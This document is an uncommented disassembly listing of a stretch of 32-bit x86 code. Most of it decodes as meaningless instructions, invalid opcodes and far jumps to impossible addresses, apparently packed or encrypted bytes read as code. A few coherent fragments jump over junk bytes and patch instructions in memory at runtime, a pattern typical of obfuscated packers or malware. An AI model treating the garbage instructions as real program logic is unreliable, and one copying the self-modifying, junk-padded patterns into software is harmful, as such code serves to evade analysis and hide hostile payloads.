  403889:	cmp    bh,BYTE PTR [edi]
  40388b:	sub    DWORD PTR [edi-0x2e401ad5],esi
  403891:	(bad)
  403895:	out    0x29,al
  403897:	inc    eax
  403898:	or     DWORD PTR [edx-0x52],esi
  40389b:	pop    ecx
  40389c:	lea    ecx,[edx-0x26]
  40389f:	loopne 0x4038ab
  4038a1:	or     dh,ah
  4038a3:	xchg   ebp,eax
  4038a4:	out    0x20,eax
  4038a6:	fist   DWORD PTR [eax]
  4038a8:	pop    esp
  4038a9:	pop    edx
  4038aa:	hlt    
  4038ab:	sub    al,0xbe
  4038ad:	imul   eax,DWORD PTR [eax],0x51
  4038b0:	xchg   ebx,eax
  4038b1:	popa   
  4038b2:	fst    DWORD PTR [edi+0x79]
  4038b5:	jbe    0x403888
  4038b7:	push   eax
  4038b8:	outs   dx,BYTE PTR ds:[esi]
  4038b9:	mov    ?,esp
  4038bb:	fneni(8087 only) 
  4038bd:	imul   ebx,ebx,0x594d348a
  4038c3:	cdq    
  4038c4:	sbb    DWORD PTR ds:0xc4f91033,edx
  4038ca:	adc    eax,0x5e1d4b7e
  4038cf:	lods   eax,DWORD PTR ds:[esi]
  4038d0:	xor    BYTE PTR [edi+0xa4fb465],bl
  4038d6:	xor    DWORD PTR [ebx-0x16],ebp
  4038d9:	bound  edi,QWORD PTR [edx+0x5]
  4038dc:	cmc    
  4038dd:	fwait
  4038de:	sar    BYTE PTR [esi+edi*1+0x64],cl
  4038e2:	cmc    
  4038e3:	mov    ebx,0xdb02ae0b
  4038e8:	dec    edi
  4038e9:	fld    DWORD PTR [ebx+0x784a44ea]
  4038ef:	les    esi,FWORD PTR [ebx]
  4038f1:	xchg   edx,eax
  4038f2:	sub    ecx,DWORD PTR [edx+0x6a69cb48]
  4038f8:	jle    0x4038d0
  4038fa:	lahf   
  4038fb:	dec    eax
  4038fc:	dec    ecx
  4038fd:	adc    al,0x99
  4038ff:	mov    ebx,DWORD PTR [edi-0x6]
  403902:	inc    ecx
  403903:	mov    edx,0x657979b
  403908:	ins    DWORD PTR es:[edi],dx
  403909:	xor    BYTE PTR [bp-0x8],ch
  40390d:	aam    0xcc
  40390f:	or     eax,0xad38ea62
  403914:	xor    ch,BYTE PTR [edi+0x51]
  403917:	cdq    
  403918:	mov    esp,0x5aa4132
  40391d:	push   ebx
  40391e:	std    
  40391f:	or     ebp,DWORD PTR [eax+0x40]
  403922:	and    edi,DWORD PTR [eax+0x4e676fdc]
  403928:	std    
  403929:	test   dl,0xa9
  40392c:	add    eax,0x931ec44f
  403931:	mov    cl,0x24
  403933:	sub    eax,0xd2db5ed
  403938:	(bad)  
  403939:	iret   
  40393a:	daa    
  40393b:	in     al,0xfd
  40393d:	out    dx,eax
  40393e:	enter  0xdb25,0x8e
  403942:	repnz stos BYTE PTR es:[edi],al
  403944:	mov    ch,BYTE PTR [ecx-0x599078c]
  40394a:	pusha  
  40394b:	xor    edi,ebp
  40394d:	out    dx,al
  40394e:	shl    DWORD PTR [eax-0x75d72c3e],0xc8
  403955:	out    0x57,eax
  403957:	add    DWORD PTR [edx],edx
  403959:	adc    eax,0x711103eb
  40395e:	ins    BYTE PTR es:[edi],dx
  40395f:	adc    al,0x69
  403961:	call   0xedb88b10
  403966:	nop
  403967:	push   ebp
  403968:	and    edi,eax
  40396a:	test   eax,0x7824bcf6
  40396f:	and    ebp,DWORD PTR [esi+0x79]
  403972:	fsub   QWORD PTR [ebp-0x42d79ae9]
  403978:	into   
  403979:	(bad)  
  40397a:	das    
  40397b:	popa   
  40397c:	jns    0x4038fe
  40397e:	inc    edx
  40397f:	xchg   esi,eax
  403980:	dec    edi
  403981:	push   ecx
  403982:	sub    eax,eax
  403984:	mov    esp,0x3704f5d8
  403989:	xlat   BYTE PTR ds:[ebx]
  40398a:	inc    ebx
  40398b:	xor    DWORD PTR [ebx-0x6],esp
  40398e:	aam    0xf2
  403990:	xchg   ebp,eax
  403991:	sub    DWORD PTR [esi+0xfc085e3],eax
  403997:	test   BYTE PTR [esi],dh
  403999:	add    al,0x0
  40399b:	add    BYTE PTR [ebp-0x977b],cl
  4039a1:	call   DWORD PTR [eax-0x75]
  4039a4:	inc    ebp
  4039a5:	in     al,0x33
  4039a7:	mov    BYTE PTR [ebx],0xc7
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	and    ecx,DWORD PTR [ecx+0x1df7df92]
  4039d6:	jle    0x403a56
  4039d8:	outs   dx,DWORD PTR ds:[esi]
  4039d9:	jge    0x403a59
  4039db:	jle    0x403a37
  4039dd:	xchg   ebx,eax
  4039de:	fsub   st(2),st
  4039e0:	push   es
  4039e1:	jp     0x403a4a
  4039e3:	xor    BYTE PTR [edi],al
  4039e5:	das    
  4039e6:	int3   
  4039e7:	cs sbb ecx,eax
  4039ea:	aas    
  4039eb:	push   es
  4039ec:	adc    al,ah
  4039ee:	stos   DWORD PTR es:[edi],eax
  4039ef:	scas   eax,DWORD PTR es:[edi]
  4039f0:	mov    ?,esi
  4039f2:	cli    
  4039f3:	add    edi,ebx
  4039f5:	loopne 0x403a17
  4039f7:	push   edi
  4039f8:	or     esp,edi
  4039fa:	dec    esi
  4039fb:	clc    
  4039fc:	std    
  4039fd:	addr16 ret 0x5b20
  403a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a02:	mov    dl,0x53
  403a04:	mov    dl,0x47
  403a06:	push   ebp
  403a07:	ficomp DWORD PTR [ecx]
  403a09:	sti    
  403a0a:	inc    esi
  403a0b:	ja     0x403a1f
  403a0d:	pop    ss
  403a0e:	int3   
  403a0f:	retfw  
  403a11:	jb     0x4039f0
  403a13:	and    dh,0xad
  403a16:	pop    esp
  403a17:	mov    WORD PTR [edx],fs
  403a19:	enter  0xce61,0xf5
  403a1d:	jmp    0xe224:0x5608c9a
  403a24:	xor    DWORD PTR [edx-0x9],edi
  403a27:	cdq    
  403a28:	test   al,0xff
  403a2a:	rcl    DWORD PTR [ecx+esi*2-0x65],cl
  403a2e:	and    cl,al
  403a30:	imul   esp,DWORD PTR [esi-0x60],0x182ec8cc
  403a37:	rcl    BYTE PTR [edi],1
  403a39:	sub    ah,BYTE PTR [esi-0x222e23ab]
  403a3f:	aaa    
  403a40:	mov    ch,0x91
  403a42:	aas    
  403a43:	jmp    0x8d5f59d1
  403a48:	out    0xb6,eax
  403a4a:	icebp  
  403a4b:	pushf  
  403a4c:	adc    edx,DWORD PTR [ebx]
  403a4e:	(bad)  [eax+0x4]
  403a51:	sbb    al,0xc5
  403a53:	add    al,BYTE PTR [ebx-0x39]
  403a56:	dec    esi
  403a57:	pop    edi
  403a58:	cs push edx
  403a5a:	aaa    
  403a5b:	pop    esi
  403a5c:	stc    
  403a5d:	sub    DWORD PTR [esi+0xfd47f99],edi
  403a63:	sub    esp,DWORD PTR [ecx+edx*4]
  403a66:	jae    0x403acc
  403a68:	mov    WORD PTR [esi-0x64357baa],ss
  403a6e:	aas    
  403a6f:	rol    bh,cl
  403a71:	lea    ebp,[edi-0x4967d367]
  403a77:	jae    0x403a8f
  403a79:	clc    
  403a7a:	sar    eax,1
  403a7c:	xor    bl,BYTE PTR [edx-0x3d]
  403a7f:	inc    edi
  403a80:	mov    ebx,0xb61bf6f8
  403a85:	pop    es
  403a86:	call   0x553d:0x5052c452
  403a8d:	test   DWORD PTR [eax],esp
  403a8f:	ja     0x403aac
  403a91:	jecxz  0x403a7a
  403a93:	shl    ebp,1
  403a95:	mov    dl,0x1f
  403a97:	xchg   ecx,eax
  403a98:	in     eax,dx
  403a99:	outs   dx,DWORD PTR ds:[esi]
  403a9a:	(bad)  
  403a9c:	add    ch,BYTE PTR [ecx]
  403a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a9f:	sbb    eax,0xf36a0eb4
  403aa4:	add    ebx,DWORD PTR [edx+ebx*4]
  403aa7:	mov    dh,0xfa
  403aa9:	sub    ebx,DWORD PTR [edi+0x34]
  403aac:	out    dx,eax
  403aad:	inc    edi
  403aae:	adc    BYTE PTR [ecx-0x41],cl
  403ab1:	jp     0x403af3
  403ab3:	ret    
  403ab4:	jnp    0x403b1c
  403ab6:	mov    fs,WORD PTR [esi]
  403ab8:	aas    
  403ab9:	mov    bl,BYTE PTR [esi+ebp*1]
  403abc:	aam    0xe2
  403abe:	inc    edi
  403abf:	pop    ecx
  403ac0:	(bad)  
  403ac1:	fs repz mov dl,0x59
  403ac5:	das    
  403ac6:	ret    
  403ac7:	pop    edi
  403ac8:	cdq    
  403ac9:	mov    ebp,0xd2521bc7
  403ace:	push   edi
  403acf:	imul   ebx,DWORD PTR [esi+0x4dbe0a8f],0xa07c34bd
  403ad9:	(bad)  
  403ada:	int3   
  403adb:	sub    DWORD PTR [ebp-0x43],edi
  403ade:	mov    ds,ecx
  403ae0:	inc    ecx
  403ae1:	sbb    al,0x13
  403ae3:	sub    eax,0x1a8d0abd
  403ae8:	mov    dh,0x99
  403aea:	ins    BYTE PTR es:[edi],dx
  403aeb:	shl    DWORD PTR [esi],cl
  403aed:	add    ah,al
  403aef:	xor    dl,BYTE PTR [ebx]
  403af1:	in     eax,dx
  403af2:	out    dx,eax
  403af3:	push   ebx
  403af4:	and    edx,eax
  403af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af7:	mov    bh,0xac
  403af9:	cmp    edx,esi
  403afb:	pushf  
  403afc:	out    dx,eax
  403afd:	aas    
  403afe:	sbb    al,0xc3
  403b00:	js     0x403b7b
  403b02:	mov    ch,BYTE PTR ds:0x816601e6
  403b08:	mov    eax,0x2ae937f1
  403b0d:	adc    DWORD PTR [ebx+0xb],edx
  403b10:	cmp    BYTE PTR [esp+ebp*1],bh
  403b13:	mov    ebx,0xc94a1f95
  403b18:	adc    esp,DWORD PTR [ebx+0x39820afe]
  403b1e:	mov    bh,0x66
  403b20:	inc    edx
  403b21:	push   0x110fc24b
  403b26:	dec    ecx
  403b27:	or     DWORD PTR [edi],ecx
  403b29:	das    
  403b2a:	enter  0x3492,0xeb
  403b2e:	mov    ch,0xce
  403b30:	and    BYTE PTR [ebx*4+0x48db9da4],0xea
  403b38:	sbb    ecx,DWORD PTR [ecx-0x31450a33]
  403b3e:	jl     0x403afe
  403b40:	fdiv   st,st(6)
  403b42:	jne    0x403b19
  403b44:	retf   0x8d9f
  403b47:	and    eax,DWORD PTR ds:0xdc104b03
  403b4d:	ins    BYTE PTR es:[edi],dx
  403b4e:	in     al,dx
  403b4f:	(bad)  
  403b50:	fist   DWORD PTR [ecx-0x685b29c0]
  403b56:	cmp    eax,0xb3101ef
  403b5b:	mov    edx,0x8244170a
  403b60:	mov    ebp,0xcf7431d5
  403b65:	mov    eax,ds:0xc3debe1a
  403b6a:	sub    ecx,DWORD PTR [ebp+0x27244f18]
  403b70:	lock push 0xffffff8b
  403b73:	and    eax,0xd8c5d6a1
  403b78:	in     al,dx
  403b79:	out    dx,al
  403b7a:	fsubr  st,st(0)
  403b7c:	stos   DWORD PTR es:[edi],eax
  403b7d:	adc    bl,BYTE PTR [esi-0x7f]
  403b80:	xor    al,0x4
  403b82:	adc    ecx,DWORD PTR [ebp+edx*1+0x6e2aec56]
  403b89:	in     al,0xa8
  403b8b:	xchg   ebp,eax
  403b8c:	popa   
  403b8d:	mov    ebp,0x8eed2c3b
  403b92:	leave  
  403b93:	jnp    0x403b3a
  403b95:	test   DWORD PTR [edx],esp
  403b97:	stc    
  403b98:	or     eax,0x9e406c16
  403b9d:	mov    esi,?
  403b9f:	(bad)  
  403ba1:	push   cs
  403ba2:	ret    
  403ba3:	xchg   ebp,eax
  403ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ba5:	sub    bh,BYTE PTR [ecx+eiz*2-0x69]
  403ba9:	sub    edi,esp
  403bab:	inc    edx
  403bac:	push   ecx
  403bad:	mov    ebp,0x432ce155
  403bb2:	sub    BYTE PTR [edi],cl
  403bb4:	add    eax,0x46a5368a
  403bba:	mov    ebp,0xd98da5f1
  403bbf:	daa    
  403bc0:	retf   
  403bc1:	mov    dl,0x3
  403bc3:	push   edx
  403bc4:	int    0xa8
  403bc6:	jo     0x403b57
  403bc8:	les    edx,FWORD PTR [eax-0x79bcbe4e]
  403bce:	push   esp
  403bcf:	mov    dl,0xff
  403bd1:	mov    dl,0xb4
  403bd3:	adc    DWORD PTR [ebx-0x11],0xffffff9a
  403bd7:	xchg   esi,eax
  403bd8:	mov    dh,0x7
  403bda:	dec    esp
  403bdb:	sbb    al,0xe2
  403bdd:	(bad)  [esi-0x1f]
  403be0:	aaa    
  403be1:	ja     0x403c12
  403be3:	(bad)  
  403be4:	xor    al,0xb9
  403be6:	repnz pop eax
  403be8:	sub    bh,BYTE PTR [ecx]
  403bea:	icebp  
  403beb:	or     DWORD PTR [edi+0x12],0xffffffc8
  403bef:	xchg   ebp,eax
  403bf0:	dec    eax
  403bf1:	in     eax,0x8
  403bf3:	loopne 0x403c38
  403bf5:	mov    bl,0x2e
  403bf7:	cmp    ch,bl
  403bf9:	cwde   
  403bfa:	xchg   esi,eax
  403bfb:	sub    DWORD PTR [ebp-0xcae08ef],esp
  403c01:	hlt    
  403c02:	pop    ds
  403c03:	out    0xea,eax
  403c05:	mov    esi,ebp
  403c07:	leave  
  403c08:	and    ebp,ecx
  403c0a:	push   es
  403c0b:	cdq    
  403c0c:	xor    BYTE PTR [ebx+0x49],0xb7
  403c10:	dec    ebp
  403c11:	push   ss
  403c12:	icebp  
  403c13:	jmp    0x7bcca151
  403c18:	cmp    eax,0x3ec01b58
  403c1d:	adc    al,0xc6
  403c1f:	jecxz  0x403c9d
  403c21:	jae    0x403bec
  403c23:	jmp    0x570a:0x6e92de1e
  403c2a:	data16 fdivr st,st(2)
  403c2d:	mov    ah,0x52
  403c2f:	mov    cl,0xd1
  403c31:	sub    DWORD PTR [ebp-0x23],ecx
  403c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c35:	jnp    0x403c43
  403c37:	aam    0xc4
  403c39:	lea    esp,[edx]
  403c3b:	je     0x403c8b
  403c3d:	xchg   edi,eax
  403c3e:	dec    eax
  403c3f:	push   edx
  403c40:	ja     0x403bd9
  403c42:	call   0x29df1c91
  403c47:	fmul   st(4),st
  403c49:	pop    eax
  403c4a:	in     al,dx
  403c4b:	rol    BYTE PTR [ebx-0x5390e09a],cl
  403c51:	mov    al,BYTE PTR [edx+0x1ae56181]
  403c57:	outs   dx,DWORD PTR ds:[esi]
  403c58:	adc    al,0xa2
  403c5a:	adc    al,0x7d
  403c5c:	mov    ebx,0xe63d305f
  403c61:	sub    BYTE PTR [ebx],bh
  403c63:	push   cs
  403c64:	push   es
  403c65:	pop    ebx
  403c66:	add    eax,0x611a3322
  403c6b:	cdq    
  403c6c:	fimul  DWORD PTR [ebp-0x3d]
  403c6f:	icebp  
  403c70:	inc    esi
  403c71:	stos   BYTE PTR es:[edi],al
  403c72:	inc    edi
  403c73:	add    WORD PTR [esp+eiz*4],bp
  403c77:	pop    ds
  403c78:	repz mov edx,DWORD PTR ds:0x86a0001e
  403c7f:	outs   dx,DWORD PTR ds:[esi]
  403c80:	pop    edi
  403c81:	(bad)  
  403c82:	or     esp,edi
  403c84:	mov    ds:0x26d1e168,eax
  403c89:	cs jo  0x403c91
  403c8c:	or     eax,0xf314616e
  403c91:	aam    0x4c
  403c93:	jge    0x403c2b
  403c95:	pop    es
  403c96:	push   0x36
  403c98:	pop    ss
  403c99:	int    0x29
  403c9b:	xchg   edx,eax
  403c9c:	pop    edi
  403c9d:	in     al,dx
  403c9e:	std    
  403c9f:	mov    al,0x4b
  403ca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ca4:	(bad)  
  403ca5:	pop    ecx
  403ca6:	jo     0x403c53
  403ca8:	jno    0x403d12
  403caa:	popa   
  403cab:	adc    al,0x8e
  403cad:	aam    0x82
  403caf:	xor    eax,0xc69528d6
  403cb4:	ficomp WORD PTR [ecx-0x7f8ebacc]
  403cba:	xchg   esp,eax
  403cbb:	mov    eax,DWORD PTR [ecx-0x28]
  403cbe:	call   0xb91cc5dc
  403cc3:	dec    esi
  403cc4:	xor    BYTE PTR [ebp+0x5ce35af1],cl
  403cca:	xchg   edx,eax
  403ccb:	xchg   edi,eax
  403ccc:	das    
  403ccd:	mov    ah,al
  403ccf:	adc    eax,0xa1b7d733
  403cd4:	mov    ebx,DWORD PTR [edi]
  403cd6:	adc    BYTE PTR [edx],0x4f
  403cd9:	jmp    0x1bc:0x763f32a8
  403ce0:	ins    BYTE PTR es:[edi],dx
  403ce1:	sahf   
  403ce2:	popa   
  403ce3:	je     0x403ccb
  403ce5:	cwde   
  403ce6:	xor    esi,ebx
  403ce8:	mov    edx,0x63768a51
  403ced:	add    ch,BYTE PTR [ecx-0x6371bbdb]
  403cf3:	fisttp DWORD PTR [esi-0x22d5d814]
  403cf9:	inc    edi
  403cfa:	xor    al,0x38
  403cfc:	daa    
  403cfd:	xor    ebx,DWORD PTR [esi+ebx*1+0x597d0a2f]
  403d04:	mov    ds:0x56d4551b,al
  403d09:	and    bh,al
  403d0b:	cs iret 
  403d0d:	(bad)  
  403d0e:	call   0xac41:0xedaa0443
  403d15:	inc    ecx
  403d16:	in     eax,0x63
  403d18:	jle    0x403c9f
  403d1a:	rcl    DWORD PTR [ebp-0x6e7a694],0x24
  403d21:	out    dx,al
  403d22:	xlat   BYTE PTR ds:[ebx]
  403d23:	aam    0x52
  403d25:	or     eax,0xdcb3c19
  403d2a:	pop    ss
  403d2b:	dec    esi
  403d2c:	inc    ebp
  403d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d2e:	out    0x4d,eax
  403d30:	push   eax
  403d31:	pop    ebp
  403d32:	sbb    BYTE PTR ds:0x93f2197,bh
  403d38:	dec    eax
  403d39:	push   ebp
  403d3a:	jo     0x403d50
  403d3c:	mov    esi,0x92f1a34f
  403d41:	cmp    al,0xc
  403d43:	xlat   BYTE PTR ds:[ebx]
  403d44:	cmp    eax,0x82b719a7
  403d49:	cs lock (bad) 
  403d4c:	shl    BYTE PTR [esp+ecx*8+0x3c],1
  403d50:	mov    ch,0x1d
  403d52:	adc    ebx,DWORD PTR [eax-0x4e29b993]
  403d58:	outs   dx,DWORD PTR ds:[esi]
  403d59:	dec    edi
  403d5a:	mov    BYTE PTR ds:0x3ee38f53,0x8c
  403d61:	jecxz  0x403d6f
  403d63:	mov    al,0xb5
  403d65:	es xor BYTE PTR ds:[ecx-0x49],bl
  403d6a:	cmp    DWORD PTR [ecx],esi
  403d6c:	fadd   st(1),st
  403d6e:	sub    al,0x8c
  403d70:	jle    0x403cf6
  403d72:	imul   esi,DWORD PTR [esp+esi*2+0x4],0xffffffd8
  403d77:	sub    eax,0xdae24991
  403d7c:	or     ebp,ebx
  403d7e:	sbb    ah,BYTE PTR [eax-0x70cbb8d3]
  403d84:	rcl    BYTE PTR [ebp+0x685e8f00],1
  403d8a:	test   bh,cl
  403d8c:	ret    
  403d8d:	xor    esp,DWORD PTR [eax+0x19]
  403d90:	cld    
  403d91:	aaa    
  403d92:	fucomp st(4)
  403d94:	push   esi
  403d95:	les    ebx,FWORD PTR [edx+0x25]
  403d98:	jnp    0x403ddf
  403d9a:	iret   
  403d9b:	jl     0x403e14
  403d9d:	clc    
  403d9e:	adc    DWORD PTR [ebp-0x5e],ecx
  403da1:	push   esi
  403da2:	out    dx,al
  403da3:	jbe    0x403d77
  403da5:	mov    ch,0xd3
  403da7:	lods   al,BYTE PTR ds:[esi]
  403da8:	jle    0x403d74
  403daa:	xchg   DWORD PTR [ebx-0x24fc7a7a],eax
  403db0:	imul   esi,DWORD PTR [ebx+0x265894b0],0xd3dcd383
  403dba:	ins    DWORD PTR es:[edi],dx
  403dbb:	mov    cs,WORD PTR [eax]
  403dbd:	out    0x35,eax
  403dbf:	or     eax,0x9ccafc36
  403dc4:	daa    
  403dc5:	jbe    0x403e23
  403dc7:	push   ebx
  403dc8:	pop    esi
  403dc9:	push   0xffffff8d
  403dcb:	fcomip st,st(1)
  403dcd:	call   0x40c099
  403dd2:	mov    ecx,DWORD PTR [ebp-0x28]
  403dd5:	xor    ecx,esi
  403dd7:	mov    eax,0xffcd8d65
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [edx-0x1bb32b36],ebx
  403e17:	sbb    DWORD PTR [esi+0x7e],edi
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403db8
  403e1f:	mov    bl,0xab
  403e21:	(bad)  
  403e23:	pop    edx
  403e24:	cmp    cl,dl
  403e26:	sub    DWORD PTR [edi+0x60fac46f],0x8ddd88d0
  403e30:	cmp    eax,0xef55491a
  403e35:	mov    ?,edi
  403e37:	pop    eax
  403e38:	xchg   edx,eax
  403e39:	test   eax,0xb777d4f3
  403e3e:	mov    WORD PTR [edi],ss
  403e40:	sahf   
  403e41:	mov    BYTE PTR [edx],0x3c
  403e44:	jnp    0x403e47
  403e46:	enter  0xece4,0x68
  403e4a:	xor    eax,0xb7c06fcb
  403e4f:	test   DWORD PTR [edx],edx
  403e51:	dec    edx
  403e52:	and    eax,0xc861bcb7
  403e57:	dec    esp
  403e58:	inc    edx
  403e59:	jge    0x403e65
  403e5b:	push   ebx
  403e5c:	shl    DWORD PTR [esi-0x74843dff],1
  403e62:	mov    cl,0xf2
  403e64:	aaa    
  403e65:	xor    esp,DWORD PTR [ecx+eax*1]
  403e68:	xchg   esi,eax
  403e69:	ss pop edx
  403e6b:	ss (bad) 
  403e6e:	cmp    edi,DWORD PTR [esi]
  403e70:	mov    ebx,0x3b31ab34
  403e75:	mov    esi,esp
  403e77:	or     ch,BYTE PTR [edi]
  403e79:	mov    ebp,cs
  403e7b:	lds    ebp,FWORD PTR [esi+0x7e]
  403e7e:	xchg   ebp,eax
  403e7f:	or     edx,DWORD PTR [eax+0x2]
  403e82:	mov    edi,0x116f1ae4
  403e87:	ror    DWORD PTR [ecx],1
  403e89:	cmp    ecx,edx
  403e8b:	call   0xf411:0xbfd99130
  403e92:	adc    DWORD PTR [eax+0x1a],ebp
  403e95:	dec    esp
  403e96:	shl    BYTE PTR [edi+0x15],cl
  403e99:	cs enter 0x6b18,0xed
  403e9e:	aam    0x78
  403ea0:	dec    edi
  403ea1:	gs aad 0xbc
  403ea4:	xchg   ebp,eax
  403ea5:	jo     0x403ea4
  403ea7:	inc    edx
  403ea8:	cmp    DWORD PTR [esi],esp
  403eaa:	xor    ch,BYTE PTR [eax-0x1cab9712]
  403eb0:	lods   al,BYTE PTR ds:[esi]
  403eb1:	cwde   
  403eb2:	ficom  DWORD PTR [edi]
  403eb4:	mov    ss,WORD PTR [ebp-0x6f]
  403eb7:	lods   al,BYTE PTR ds:[esi]
  403eb8:	loop   0x403f12
  403eba:	adc    DWORD PTR [ebx+0x72],ecx
  403ebd:	pop    eax
  403ebe:	sub    DWORD PTR [esi-0x5c],0xffffffdc
  403ec2:	int    0x79
  403ec4:	in     eax,dx
  403ec5:	fadd   DWORD PTR [ecx-0x3f]
  403ec8:	and    DWORD PTR [ecx-0x41866d04],ebx
  403ece:	jmp    0x403f2e
  403ed0:	mov    cl,0x94
  403ed2:	adc    eax,DWORD PTR [esi-0x35]
  403ed5:	hlt    
  403ed6:	or     ebp,DWORD PTR [ecx]
  403ed8:	mov    al,ds:0xae545a37
  403edd:	adc    al,0x2f
  403edf:	dec    eax
  403ee0:	inc    eax
  403ee1:	mul    ch
  403ee3:	int    0x3d
  403ee5:	mov    al,ds:0xbee91d2a
  403eea:	sbb    DWORD PTR [edi+0x5168bd13],edi
  403ef0:	(bad)  [eax+0x3fd201bf]
  403ef6:	dec    ecx
  403ef7:	cmp    cl,BYTE PTR [eax+ebx*2]
  403efa:	sbb    dh,BYTE PTR [edx]
  403efc:	aam    0x6a
  403efe:	pusha  
  403eff:	mov    bh,0xd9
  403f01:	xor    ah,BYTE PTR [ebx+edx*4-0x54733e55]
  403f08:	cmp    eax,0xfd4eb370
  403f0d:	stos   DWORD PTR es:[edi],eax
  403f0e:	mov    bl,0x9e
  403f10:	test   DWORD PTR [esp+ebx*2],esi
  403f13:	xchg   edi,eax
  403f14:	mov    bl,0x8b
  403f16:	cmp    DWORD PTR [eax+0x4a],esp
  403f19:	mov    ecx,0xe3cb5dae
  403f1e:	stos   BYTE PTR es:[edi],al
  403f1f:	mov    ah,0x18
  403f21:	(bad)  
  403f22:	loop   0x403f29
  403f24:	(bad)  
  403f25:	add    BYTE PTR gs:[eax+0x44],bh
  403f29:	push   edi
  403f2a:	loope  0x403f86
  403f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f2d:	mov    al,0xb6
  403f2f:	lds    eax,FWORD PTR [ebx+0x11de0989]
  403f35:	push   eax
  403f36:	jmp    0x403ecf
  403f38:	shr    BYTE PTR [esi-0x3ee61508],1
  403f3e:	jb     0x403fbe
  403f40:	pop    edx
  403f41:	sbb    eax,0x5c4f344c
  403f46:	mov    ebp,0x637e5f6
  403f4b:	dec    eax
  403f4c:	mov    bl,0x51
  403f4e:	fld    QWORD PTR [eax]
  403f50:	jmp    0xb794:0x6944e619
  403f57:	lods   al,BYTE PTR ds:[esi]
  403f58:	mov    ds:0xf4eb46c5,al
  403f5d:	push   ss
  403f5e:	test   BYTE PTR [edi],bl
  403f60:	test   esp,esp
  403f62:	sbb    edx,DWORD PTR [edx+0x4c]
  403f65:	mov    al,ds:0xd753dcb1
  403f6a:	add    esi,eax
  403f6c:	dec    eax
  403f6d:	jmp    0x17b3a4f1
  403f72:	jp     0x403fe8
  403f74:	mov    al,0xd1
  403f76:	repnz mov eax,ds:0xd3a163af
  403f7c:	sbb    eax,0x82a100f
  403f81:	test   eax,0xa6be8d0b
  403f86:	imul   edx,ebp,0x4a
  403f89:	arpl   si,cx
  403f8b:	aad    0x93
  403f8d:	or     ebx,DWORD PTR [edx+0x4957ada7]
  403f93:	jmp    0xb886:0x4ce6f12a
  403f9a:	loope  0x403f88
  403f9c:	mov    al,0xad
  403f9e:	pop    ds
  403f9f:	xor    eax,0x3c4e206f
  403fa4:	pop    ecx
  403fa5:	rol    BYTE PTR [ebx],cl
  403fa7:	inc    ebp
  403fa8:	fcomp  QWORD PTR [ecx+0x45]
  403fab:	mov    al,ds:0x909ebfca
  403fb0:	xchg   edx,eax
  403fb1:	cmp    al,0xe7
  403fb3:	inc    ebp
  403fb4:	out    dx,al
  403fb5:	fbld   TBYTE PTR [edi]
  403fb7:	push   0x7b
  403fb9:	xchg   ebp,eax
  403fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fbb:	dec    edi
  403fbc:	in     eax,dx
  403fbd:	dec    edx
  403fbe:	jnp    0x403f61
  403fc0:	lods   al,BYTE PTR ds:[esi]
  403fc1:	add    BYTE PTR [edi+eiz*2+0x4f],al
  403fc5:	test   al,0x9d
  403fc7:	sub    BYTE PTR [ecx+0x1b],0xb3
  403fcb:	jle    0x404037
  403fcd:	sar    cl,cl
  403fcf:	jmp    0xdb7b3957
  403fd4:	lock ja 0x40404d
  403fd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fd9:	or     eax,0xcc8c290f
  403fde:	mov    eax,0xea3c78a6
  403fe3:	mov    eax,DWORD PTR [eax+0x15160706]
  403fe9:	inc    eax
  403fea:	mov    fs,esi
  403fec:	stos   DWORD PTR es:[edi],eax
  403fed:	sub    DWORD PTR [ebp-0x59],edi
  403ff0:	(bad)  
  403ff1:	mov    al,ds:0x3b7e5c76
  403ff6:	xchg   ebp,eax
  403ff7:	adc    dh,BYTE PTR [ebx-0x3f8c2dd6]
  403ffd:	pushf  
  403ffe:	cmc    
  403fff:	fisub  WORD PTR [ebx-0x71]
  404002:	or     al,0x68
  404004:	dec    ebp
  404005:	int    0x48
  404007:	push   esi
  404008:	jg     0x403fb5
  40400a:	mov    edi,0x6517293a
  40400f:	sbb    ebx,DWORD PTR [edi]
  404011:	and    BYTE PTR [ebx],dh
  404013:	mov    ds:0x25ed3a98,eax
  404018:	adc    bl,BYTE PTR [edi]
  40401a:	shr    DWORD PTR [esi],1
  40401c:	xor    bh,BYTE PTR [edx-0x45]
